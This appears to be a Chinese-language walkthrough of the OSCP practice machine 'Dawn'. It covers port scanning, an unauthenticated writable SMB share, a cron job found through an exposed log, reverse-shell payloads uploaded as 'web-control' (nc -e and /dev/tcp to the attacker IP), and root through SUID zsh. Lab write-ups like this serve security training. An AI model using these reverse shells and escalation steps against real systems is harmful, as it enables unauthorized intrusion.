# OSCP系列靶场-Esay-Dawn

## 总结

getwebshell → `SMB`共享无密码 → `SMB`存在上传功能 → 存在周期执行任务 → `SMB`上传反弹`shell`→
被执行获得`webshell`

提 权 思 路 → `suid`发现`zsh`→ `-p`容器提权

## 准备工作

  * 启动VPN  
获取攻击机IP > `192.168.45.163`

![](https://image.3001.net/images/20230725/1690217025_64beaa41bd570b745d550.png!small)

  * 启动靶机  
获取目标机器IP > `192.168.242.11`

![](https://image.3001.net/images/20230725/1690217027_64beaa432376ff77f6ea6.png!small)

## 信息收集-端口扫描

### 目标开放端口收集

  * Nmap开放端口扫描2次

    
    
    sudo nmap --min-rate 10000 -p- 192.168.242.11
    

![](https://image.3001.net/images/20230725/1690217028_64beaa44915802f89f404.png!small)

通过两次收集到的端口:`→80,139,445,3306`

### 目标端口对应服务探测

    
    
    # tcp探测
    sudo nmap -sT -sV -O -sC -p80,139,445,3306 192.168.242.11
    

![](https://image.3001.net/images/20230725/1690217032_64beaa48520f047475ba1.png!small)

## 信息收集-端口测试

80/tcp open http Apache httpd 2.4.38 ((Debian))  
445/tcp open netbios- Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)  
3306/tcp open mysql MySQL 5.5.5-10.3.15-MariaDB-1  
首先思考445端口是否存在SMB共享内容，在思考3306端口是否存在弱口令，最后来挖掘80端口

### 445-SMB端口的信息收集

#### 445-SMB是否无需密码探测(存在)

连接成功则SMB没有开启密码

    
    
    # 利用-L查看SMB的内容
    smbclient -L //192.168.242.11
    

发现`SMB`服务不需要密码即可访问，查看到了目录`ITDEPT`

![](https://image.3001.net/images/20230725/1690217033_64beaa49aaa3ce5547231.png!small)

#### 445-SMB文件信息收集

    
    
    # 利用获取到的[sambashare]直接进行访问查看内容
    smbclient //192.168.242.11/ITDEPT -U root
    

查看了一下文件，没发现什么有用的内容

![](https://image.3001.net/images/20230725/1690217034_64beaa4aad666d629e992.png!small)

#### 445-SMB的上传(可能有用)

    
    
    # 利用获取到的sambashare直接进行访问之后尝试使用PUT是否成功
    smbclient //192.168.242.11/ITDEPT -U root
    smb :\ > put [上传的文件]
    

尝试了上传功能，发现`SMB`的上传功能开启

![](https://image.3001.net/images/20230725/1690217035_64beaa4b943791309b74b.png!small)

#### 445-SMB用户名获取

    
    
    # 抓取用户名
    enum4linux 192.168.242.11
    

抓着玩，先去干其他的

![](https://image.3001.net/images/20230725/1690217036_64beaa4c95c58c7cb144e.png!small)

### 3306-Mysql端口的信息收集

#### 3306-Mysql端口的默认脆弱口令测试(失败)

    
    
    # 尝试直接使用mysql协议进行root:root尝试(远程需-h)
    ┌──(root㉿Kali)-[/home/bachang/Dawn]
    └─# mysql -h 192.168.242.11 -uroot -proot
    ERROR 1045 (28000): Access denied for user 'root'<span class="label label-primary">@'192.168.45.163'</span> (using password: YES)
    

### 80-HTTP端口的信息收集

访问 http://192.168.242.11/ 发现显示的是设备正在建设中，从源码步骤开始

![](https://image.3001.net/images/20230725/1690217038_64beaa4e1471d111b5bc7.png!small)

#### 信息收集-源码查看

    
    
    # 包括文章中是否写明一些敏感信息
    curl http://192.168.242.11
    # 利用html2text转换纯文本方便查看
    curl http://192.168.242.11 | html2text
    

没什么有用的信息

![](https://image.3001.net/images/20230725/1690217039_64beaa4f129ed971d6fbb.png!small)

#### 信息收集-目录扫描

##### 信息收集-目录扫描初步

如果扫描发现301适当考虑 -r 2 进行递归

    
    
    dirsearch -u http://192.168.242.11 -x 302,403
    

![](https://image.3001.net/images/20230725/1690217040_64beaa5025992aade909a.png!small)

因为扫出了目录，深层次的扫描待选

    
    
    信息收集-目录扫描(后缀)
    信息收集-目录扫描(深度/大字典)
    信息收集-目录扫描(深度/大字典后缀)
    

#### 信息收集-端点查看

`/log`端点查看  
发现该端点存在路径遍历

![](https://image.3001.net/images/20230725/1690217041_64beaa515abac9442746a.png!small)  
访问了其中的内容，发现只有`management.log`可以查看

![](https://image.3001.net/images/20230725/1690217042_64beaa525dc338f3052bc.png!small)  
下载之后进行查看，发现为系统内运行日志

![](https://image.3001.net/images/20230725/1690217043_64beaa535566f31bba45d.png!small)

##### 文件的信息收集

收集到了账户信息 `ganimedes`  
在查看的过程中发现每分钟会执行重复的命令，在充满的命令中发现一些有趣的内容  
确认了会周期性的执行给`777`的权限到对应的文件

![](https://image.3001.net/images/20230725/1690217044_64beaa5471b1d847d57d1.png!small)  
并且会执行

![](https://image.3001.net/images/20230725/1690217045_64beaa55c929ad3c1df16.png!small)

## 漏洞利用-getwebshell

#### SMB+计划执行突破

回到之前我们发现的SMB的文件夹发现是`ITDEPT`  
和我们发现周期性日志中给`777`权的文件夹相同  
推测可以将文件上传到`SMB`，等待执行获取反弹`shell`

##### 构造反弹shell的payload

确定我们需要上传的文件名为`web-control`，构造内容

    
    
    echo 'nc -e /bin/bash 192.168.45.163 4444' > web-control
    echo 'bash -i >& /dev/tcp/192.168.45.163/4444 0>&1' > product-control
    

将文件上传到SMB中

![](https://image.3001.net/images/20230725/1690217046_64beaa56d26746241663f.png!small)

攻击机开启监听

    
    
    sudo nc -lvvp 4444
    

等待反弹shell的监听

![](https://image.3001.net/images/20230725/1690217047_64beaa57d87ac73250bc4.png!small)

成功反弹`shell`

![](https://image.3001.net/images/20230725/1690217049_64beaa591dea5b4778a58.png!small)

## 内网遨游-getshell

### 交互shell

#### 交互shell-python

由于获取的shell交互不友好，利用python获得新的交互shell

    
    
    # 利用python获取交互shell -> python失败使用python3
    python -c "import pty;pty.spawn('/bin/bash')";
    

![](https://image.3001.net/images/20230725/1690217049_64beaa59f1925febd830b.png!small)

### FLAG1获取

    
    
    www-data<span class="label label-primary">@dawn</span>:~$ find / -name local.txt 2>/dev/null
    /home/dawn/local.txt
    cat /home/dawn/local.txt
    *************************
    

![](https://image.3001.net/images/20230725/1690217050_64beaa5abe6e08b34108b.png!small)

### 信息收集-内网基础信息收集

在获取shell之后我们要进行内网信息的收集，都是为了`提权`做准备

#### 检测操作系统的发行版本

    
    
    # 确定发行版本
    lsb_release -a
    

![](https://image.3001.net/images/20230725/1690217051_64beaa5b74bf26ba9a743.png!small)

#### 查看内核版本信息

    
    
    # 确定内核版本
    uname -a
    

![](https://image.3001.net/images/20230725/1690217052_64beaa5c55481ca381cd7.png!small)

#### 确认home目录下用户

    
    
    # 发现了两个用户 和我们收集的一样
    ls -al /home
    

![](https://image.3001.net/images/20230725/1690217053_64beaa5d0907faef0c63b.png!small)

##### 确认每个home目录下是否有隐藏文件(待定)

    
    
    # 例如.ssh找密码  ./*_history找历史记录等
    ls -al /home/dawn
    

发现了隐藏的内容，先放一边，没思路就来

![](https://image.3001.net/images/20230725/1690217053_64beaa5ddfd33e2734a6a.png!small)

### 权限提升

#### Linux提权-sudo提权尝试

查找具有`sudo`权限，且不需要密码的可提权文件

    
    
    # 利用sudo -l寻找
    sudo -l
    

发现`sudo`的是`sudo`，不太能提权

![](https://image.3001.net/images/20230725/1690217054_64beaa5ec2ba2d3ceb56f.png!small)

### Linux提权-suid提权尝试

    
    
    # -perm 文件权限
    find / -perm -u=s -type f 2>/dev/null
    

发现了`zsh`进行搜索

![](https://image.3001.net/images/20230725/1690217055_64beaa5fa3ebf6768b582.png!small)

如果发现有东西的话 访问 https://gtfobins.github.io 寻找

![](https://image.3001.net/images/20230725/1690217056_64beaa60c1b1c887699ee.png!small)  
`zsh`的提权其实与`bash`的类似

    
    
    # 以下命令将以root身份打开一个zsh shell
    zsh -p
    

提权成功

![](https://image.3001.net/images/20230725/1690217057_64beaa61b87bb3e614f22.png!small)

### FLAG2获取

    
    
    cat /root/proof.txt
    ************************
    

![](https://image.3001.net/images/20230725/1690217058_64beaa6288dda665eea05.png!small)  
完结撒花~

